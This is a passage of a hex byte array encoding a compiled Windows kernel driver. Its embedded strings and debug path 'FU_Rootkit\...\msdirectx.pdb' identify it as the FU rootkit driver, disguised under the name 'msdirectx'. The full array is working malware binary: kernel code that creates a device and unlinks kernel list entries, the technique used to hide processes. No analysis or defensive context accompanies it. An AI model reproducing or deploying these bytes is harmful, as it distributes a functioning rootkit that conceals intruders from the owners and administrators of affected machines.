    0x8B, 0xF8, 0xEB, 0x25, 0x39, 0x5F, 0x20, 0x74, 0x1E, 0x66, 0x39, 0x5F, 0x24, 0x74, 0x18, 0x53, 
    0x8D, 0x47, 0x2C, 0x50, 0x8D, 0x45, 0xCC, 0x50, 0xFF, 0x15, 0x18, 0x20, 0x01, 0x00, 0x85, 0xC0, 
    0x74, 0x0D, 0xA1, 0x10, 0x30, 0x01, 0x00, 0x8B, 0x3F, 0x39, 0x07, 0x75, 0xD7, 0xEB, 0x0F, 0x8B, 
    0x47, 0x04, 0x8B, 0x0F, 0x89, 0x08, 0x8B, 0x07, 0x8B, 0x4F, 0x04, 0x89, 0x48, 0x04, 0x8D, 0x45, 
    0xCC, 0x50, 0xFF, 0x15, 0x14, 0x20, 0x01, 0x00, 0xE9, 0x62, 0x02, 0x00, 0x00, 0xA1, 0x10, 0x30, 
    0x01, 0x00, 0x3B, 0xC3, 0x74, 0x9A, 0x8B, 0xF8, 0xEB, 0x21, 0x39, 0x5F, 0x20, 0x74, 0x1A, 0x66, 
    0x39, 0x5F, 0x24, 0x74, 0x14, 0xFF, 0x77, 0x30, 0x68, 0x08, 0x11, 0x01, 0x00, 0xE8, 0xCA, 0x03, 
    0x00, 0x00, 0xA1, 0x10, 0x30, 0x01, 0x00, 0x59, 0x59, 0x8B, 0x3F, 0x39, 0x07, 0x75, 0xDB, 0xE9, 
    0x2B, 0x02, 0x00, 0x00, 0x83, 0x7D, 0x14, 0x0C, 0x0F, 0x82, 0x1B, 0x02, 0x00, 0x00, 0x8B, 0x45, 
    0x10, 0x3B, 0xC3, 0x0F, 0x84, 0x10, 0x02, 0x00, 0x00, 0x8B, 0x08, 0x3B, 0xCB, 0x8B, 0x50, 0x04, 
    0x8B, 0x40, 0x08, 0x89, 0x55, 0xE8, 0x89, 0x45, 0x18, 0x0F, 0x84, 0x54, 0xFA, 0xFF, 0xFF, 0x3B, 
    0xD3, 0x0F, 0x84, 0x4C, 0xFA, 0xFF, 0xFF, 0x3B, 0xC3, 0x0F, 0x84, 0x44, 0xFA, 0xFF, 0xFF, 0x51, 
    0xE8, 0x35, 0xF9, 0xFF, 0xFF, 0x3B, 0xC3, 0x0F, 0x84, 0x36, 0xFA, 0xFF, 0xFF, 0x50, 0xE8, 0x0D, 
    0xF9, 0xFF, 0xFF, 0x8B, 0x0D, 0x24, 0x30, 0x01, 0x00, 0x8B, 0xD8, 0xA1, 0x2C, 0x30, 0x01, 0x00, 
    0x8B, 0x0C, 0x19, 0x03, 0xC3, 0x8B, 0x78, 0x04, 0x8B, 0x30, 0xA1, 0x28, 0x30, 0x01, 0x00, 0x8B, 
    0x04, 0x18, 0x89, 0x4D, 0x20, 0x8B, 0x0D, 0x1C, 0x30, 0x01, 0x00, 0x8B, 0x0C, 0x19, 0x68, 0x44, 
    0x64, 0x6B, 0x20, 0x57, 0x6A, 0x01, 0x89, 0x4D, 0x14, 0x89, 0x7D, 0x1C, 0x89, 0x45, 0xF0, 0xFF, 
    0x15, 0x30, 0x20, 0x01, 0x00, 0x85, 0xC0, 0x89, 0x45, 0x10, 0x0F, 0x84, 0xBE, 0xFA, 0xFF, 0xFF, 
    0x8B, 0xCF, 0x8B, 0x7D, 0x10, 0x8B, 0xD1, 0xC1, 0xE9, 0x02, 0x33, 0xC0, 0xF3, 0xAB, 0x8B, 0xCA, 
    0x83, 0xE1, 0x03, 0x85, 0xF6, 0xF3, 0xAA, 0x7E, 0x2C, 0x8B, 0x45, 0x14, 0x8B, 0x4D, 0x10, 0x83, 
    0xC0, 0x08, 0x8B, 0xD6, 0x83, 0x38, 0x00, 0x74, 0x16, 0x8B, 0x78, 0xF8, 0xFF, 0x45, 0xFC, 0x89, 
    0x39, 0x8B, 0x78, 0xFC, 0x89, 0x79, 0x04, 0x8B, 0x38, 0x89, 0x79, 0x08, 0x83, 0xC1, 0x0C, 0x83, 
    0xC0, 0x0C, 0x4A, 0x75, 0xDF, 0x8B, 0x4D, 0xFC, 0x8B, 0xC6, 0x2B, 0xC1, 0x8D, 0x0C, 0x49, 0xC1, 
    0xE1, 0x02, 0x89, 0x4D, 0xF8, 0x8B, 0x4D, 0x18, 0x8D, 0x04, 0x40, 0xC1, 0xE0, 0x02, 0x83, 0xC1, 
    0x08, 0x3B, 0xC1, 0x89, 0x45, 0xE0, 0x7D, 0x0A, 0x6A, 0x00, 0xFF, 0x75, 0x10, 0xE9, 0x46, 0xFA, 
    0xFF, 0xFF, 0x8B, 0x4D, 0x10, 0x8B, 0x55, 0x20, 0x8D, 0x04, 0x76, 0x8B, 0x75, 0xF8, 0x8D, 0x3C, 
    0x31, 0x8B, 0x75, 0x14, 0xC1, 0xE0, 0x02, 0xC1, 0xE2, 0x03, 0x03, 0xF0, 0x8B, 0xCA, 0x89, 0x45, 
    0xE4, 0x8B, 0xC1, 0xC1, 0xE9, 0x02, 0x89, 0x7D, 0xDC, 0xF3, 0xA5, 0x8B, 0xC8, 0x83, 0xE1, 0x03, 
    0xF3, 0xA4, 0x33, 0xC9, 0x39, 0x4D, 0x20, 0x7E, 0x21, 0x8B, 0x45, 0xDC, 0x8B, 0x75, 0xF0, 0x8B, 
    0x3C, 0xCE, 0x2B, 0x7D, 0xE0, 0x83, 0xC7, 0x08, 0x89, 0x38, 0x8B, 0x7C, 0xCE, 0x04, 0x89, 0x78, 
    0x04, 0x41, 0x83, 0xC0, 0x08, 0x3B, 0x4D, 0x20, 0x7C, 0xE5, 0x8B, 0x45, 0x10, 0x8B, 0x4D, 0xF8, 
    0x8B, 0x75, 0xF0, 0x03, 0xC2, 0x03, 0xC1, 0x8B, 0x48, 0xF8, 0x2B, 0x4C, 0x32, 0xF8, 0xC7, 0x40, 
    0x04, 0x07, 0x00, 0x00, 0x00, 0x03, 0x4D, 0x14, 0x8D, 0x78, 0x08, 0x03, 0x4D, 0x1C, 0x89, 0x08, 
    0x8B, 0x4D, 0x14, 0x2B, 0x0E, 0x8B, 0x75, 0xE4, 0x03, 0x4D, 0x1C, 0x03, 0xF2, 0x03, 0x75, 0x14, 
    0x8B, 0xC1, 0xC1, 0xE9, 0x02, 0xF3, 0xA5, 0x8B, 0xC8, 0x83, 0xE1, 0x03, 0xF3, 0xA4, 0x8B, 0x4D, 
    0x1C, 0x8B, 0x7D, 0x14, 0x8B, 0xF1, 0xC1, 0xE9, 0x02, 0x33, 0xC0, 0xF3, 0xAB, 0x8B, 0xCE, 0x83, 
    0xE1, 0x03, 0xF3, 0xAA, 0x8B, 0x7D, 0x14, 0x8B, 0xCE, 0x8B, 0x75, 0x10, 0x8B, 0xC1, 0xC1, 0xE9, 
    0x02, 0xF3, 0xA5, 0x8B, 0xC8, 0x8B, 0x45, 0x14, 0x83, 0xE1, 0x03, 0xF3, 0xA4, 0x8B, 0x4D, 0x18, 
    0x8B, 0x75, 0xE8, 0x03, 0xC2, 0x8B, 0x55, 0xF8, 0x8B, 0x3C, 0x10, 0x8B, 0xC1, 0xC1, 0xE9, 0x02, 
    0xF3, 0xA5, 0x8B, 0xC8, 0x83, 0xE1, 0x03, 0xF3, 0xA4, 0xA1, 0x24, 0x30, 0x01, 0x00, 0x8D, 0x0C, 
    0x18, 0xFF, 0x01, 0xA1, 0x2C, 0x30, 0x01, 0x00, 0x8B, 0x4D, 0xFC, 0x89, 0x0C, 0x18, 0x8B, 0x45, 
    0x14, 0x8B, 0x0D, 0x28, 0x30, 0x01, 0x00, 0x03, 0xC2, 0x89, 0x04, 0x19, 0x6A, 0x00, 0xFF, 0x75, 
    0x10, 0xFF, 0x15, 0x2C, 0x20, 0x01, 0x00, 0xEB, 0x06, 0xC7, 0x06, 0x06, 0x02, 0x00, 0xC0, 0x8B, 
    0x45, 0x24, 0x8B, 0x00, 0x5F, 0x5E, 0x5B, 0xC9, 0xC2, 0x24, 0x00, 0xCC, 0x55, 0x8B, 0xEC, 0x53, 
    0x56, 0x8B, 0x75, 0x0C, 0x8B, 0x46, 0x60, 0x33, 0xDB, 0x8D, 0x4E, 0x18, 0x57, 0x8B, 0x7E, 0x0C, 
    0x89, 0x19, 0x89, 0x5E, 0x1C, 0x80, 0x38, 0x0E, 0x8B, 0x50, 0x0C, 0x89, 0x7D, 0x0C, 0x75, 0x2B, 
    0x8B, 0xDA, 0x83, 0xE3, 0x03, 0x80, 0xFB, 0x03, 0x75, 0x05, 0x8B, 0x5E, 0x3C, 0xEB, 0x03, 0x8B, 
    0x5D, 0x0C, 0xFF, 0x75, 0x08, 0x51, 0x52, 0xFF, 0x70, 0x04, 0x53, 0xFF, 0x70, 0x08, 0x57, 0x6A, 
    0x01, 0xFF, 0x70, 0x18, 0xE8, 0x6D, 0xF7, 0xFF, 0xFF, 0x8B, 0xD8, 0x32, 0xD2, 0x8B, 0xCE, 0xFF, 
    0x15, 0x34, 0x20, 0x01, 0x00, 0x5F, 0x5E, 0x8B, 0xC3, 0x5B, 0x5D, 0xC2, 0x08, 0x00, 0x46, 0x61, 
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x64, 
    0x65, 0x76, 0x69, 0x63, 0x65, 0x21, 0x0A, 0x00, 0x00, 0x00, 0x46, 0x61, 0x69, 0x6C, 0x65, 0x64, 
    0x20, 0x74, 0x6F, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x73, 0x79, 0x6D, 0x62, 0x6F, 
    0x6C, 0x69, 0x63, 0x20, 0x6C, 0x69, 0x6E, 0x6B, 0x21, 0x0A, 0x00, 0xCC, 0x55, 0x8B, 0xEC, 0x83, 
    0xEC, 0x10, 0x56, 0x8B, 0x35, 0x0C, 0x20, 0x01, 0x00, 0x57, 0x68, 0x98, 0x20, 0x01, 0x00, 0x8D, 
    0x45, 0xF0, 0x50, 0xFF, 0xD6, 0x68, 0x6C, 0x20, 0x01, 0x00, 0x8D, 0x45, 0xF8, 0x50, 0xFF, 0xD6, 
    0x8B, 0x75, 0x08, 0x68, 0x04, 0x30, 0x01, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x68, 0x7B, 0x2A, 0x00, 
    0x00, 0x8D, 0x45, 0xF0, 0x50, 0x6A, 0x00, 0x56, 0xFF, 0x15, 0x3C, 0x20, 0x01, 0x00, 0x8B, 0xF8, 
    0x85, 0xFF, 0x7D, 0x07, 0x68, 0xBE, 0x19, 0x01, 0x00, 0xEB, 0x22, 0x8D, 0x45, 0xF0, 0x50, 0x8D, 
    0x45, 0xF8, 0x50, 0xFF, 0x15, 0x38, 0x20, 0x01, 0x00, 0x8B, 0xF8, 0x85, 0xFF, 0x7D, 0x18, 0xFF, 
    0x76, 0x04, 0xFF, 0x15, 0x04, 0x20, 0x01, 0x00, 0x68, 0xDA, 0x19, 0x01, 0x00, 0xE8, 0x6A, 0x00, 
    0x00, 0x00, 0x59, 0x8B, 0xC7, 0xEB, 0x58, 0xB8, 0x5C, 0x19, 0x01, 0x00, 0x89, 0x46, 0x70, 0x89, 
    0x46, 0x40, 0x89, 0x46, 0x38, 0x89, 0x46, 0x78, 0xC7, 0x46, 0x34, 0x3A, 0x10, 0x01, 0x00, 0xFF, 
    0x15, 0x10, 0x20, 0x01, 0x00, 0x50, 0xE8, 0x6D, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0xA3, 0x0C, 0x30, 
    0x01, 0x00, 0x74, 0x0F, 0x56, 0xE8, 0xC8, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0xA3, 0x10, 0x30, 0x01, 
    0x00, 0x75, 0x1A, 0x8D, 0x45, 0xF8, 0x50, 0xFF, 0x15, 0x08, 0x20, 0x01, 0x00, 0xFF, 0x76, 0x04, 
    0xFF, 0x15, 0x04, 0x20, 0x01, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x02, 0x33, 0xC0, 0x5F, 
    0x5E, 0xC9, 0xC2, 0x08, 0x00, 0xCC, 0xFF, 0x25, 0x24, 0x20, 0x01, 0x00, 0xFF, 0x25, 0x28, 0x20, 
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xA0, 0x40, 0x00, 0x00, 0xAA, 0x40, 0x00, 0x00, 0xBC, 0x40, 0x00, 0x00, 0xD4, 0x40, 0x00, 0x00, 
    0xEC, 0x40, 0x00, 0x00, 0x02, 0x41, 0x00, 0x00, 0x1A, 0x41, 0x00, 0x00, 0x34, 0x41, 0x00, 0x00, 
    0x54, 0x41, 0x00, 0x00, 0x60, 0x41, 0x00, 0x00, 0x78, 0x41, 0x00, 0x00, 0x84, 0x41, 0x00, 0x00, 
    0x98, 0x41, 0x00, 0x00, 0xB0, 0x41, 0x00, 0x00, 0xC6, 0x41, 0x00, 0x00, 0xDE, 0x41, 0x00, 0x00, 
    0xF0, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0xB5, 0xB1, 0x2E, 0x41, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x3D, 0x00, 0x00, 0x00, 0xBC, 0x20, 0x00, 0x00, 0xBC, 0x10, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00, 
    0x6F, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 
    0x73, 0x00, 0x5C, 0x00, 0x6D, 0x00, 0x73, 0x00, 0x64, 0x00, 0x69, 0x00, 0x72, 0x00, 0x65, 0x00, 
    0x63, 0x00, 0x74, 0x00, 0x78, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 
    0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x6D, 0x00, 0x73, 0x00, 0x64, 0x00, 0x69, 0x00, 
    0x72, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00, 0x78, 0x00, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53, 
    0xF4, 0xA7, 0x4D, 0xEA, 0xB3, 0x85, 0x97, 0x46, 0xA7, 0x9D, 0x5B, 0x19, 0xDC, 0xC9, 0x0E, 0xF9, 
    0x01, 0x00, 0x00, 0x00, 0x48, 0x3A, 0x5C, 0x46, 0x55, 0x5F, 0x52, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 
    0x74, 0x5C, 0x65, 0x78, 0x65, 0x5C, 0x69, 0x33, 0x38, 0x36, 0x5C, 0x6D, 0x73, 0x64, 0x69, 0x72, 
    0x65, 0x63, 0x74, 0x78, 0x2E, 0x70, 0x64, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x4E, 0xE6, 0x40, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xA1, 0x00, 0x30, 0x01, 0x00, 0x85, 0xC0, 0xB9, 0x4E, 0xE6, 0x40, 0xBB, 0x74, 0x04, 0x3B, 0xC1, 
    0x75, 0x19, 0xA1, 0x40, 0x20, 0x01, 0x00, 0x8B, 0x00, 0x35, 0x00, 0x30, 0x01, 0x00, 0xA3, 0x00, 
    0x30, 0x01, 0x00, 0x75, 0x06, 0x89, 0x0D, 0x00, 0x30, 0x01, 0x00, 0xE9, 0xCC, 0xD9, 0xFF, 0xFF, 
    0x58, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x41, 0x00, 0x00, 
    0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x40, 0x00, 0x00, 0xAA, 0x40, 0x00, 0x00, 
    0xBC, 0x40, 0x00, 0x00, 0xD4, 0x40, 0x00, 0x00, 0xEC, 0x40, 0x00, 0x00, 0x02, 0x41, 0x00, 0x00, 
    0x1A, 0x41, 0x00, 0x00, 0x34, 0x41, 0x00, 0x00, 0x54, 0x41, 0x00, 0x00, 0x60, 0x41, 0x00, 0x00, 
    0x78, 0x41, 0x00, 0x00, 0x84, 0x41, 0x00, 0x00, 0x98, 0x41, 0x00, 0x00, 0xB0, 0x41, 0x00, 0x00, 
    0xC6, 0x41, 0x00, 0x00, 0xDE, 0x41, 0x00, 0x00, 0xF0, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0xDA, 0x05, 0x73, 0x74, 0x72, 0x6E, 0x63, 0x6D, 0x70, 0x00, 0x5E, 0x01, 0x49, 0x6F, 0x44, 0x65, 
    0x6C, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x60, 0x01, 0x49, 0x6F, 
    0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 
    0x6E, 0x6B, 0x00, 0x00, 0x3B, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 
    0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x77, 0x01, 0x49, 0x6F, 
    0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 
    0x73, 0x00, 0x22, 0x04, 0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x55, 0x6E, 0x69, 0x63, 0x6F, 
    0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0xDA, 0x03, 0x52, 0x74, 0x6C, 0x43, 
    0x6F, 0x6D, 0x70, 0x61, 0x72, 0x65, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 
    0x69, 0x6E, 0x67, 0x00, 0xC6, 0x03, 0x52, 0x74, 0x6C, 0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 
    0x69, 0x6E, 0x67, 0x54, 0x6F, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 
    0x6E, 0x67, 0x00, 0x00, 0xB1, 0x05, 0x5F, 0x73, 0x6E, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x66, 0x00, 
    0x6F, 0x03, 0x50, 0x73, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 
    0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0x31, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69, 
    0x6E, 0x74, 0x00, 0x00, 0x4F, 0x00, 0x45, 0x78, 0x46, 0x72, 0x65, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 
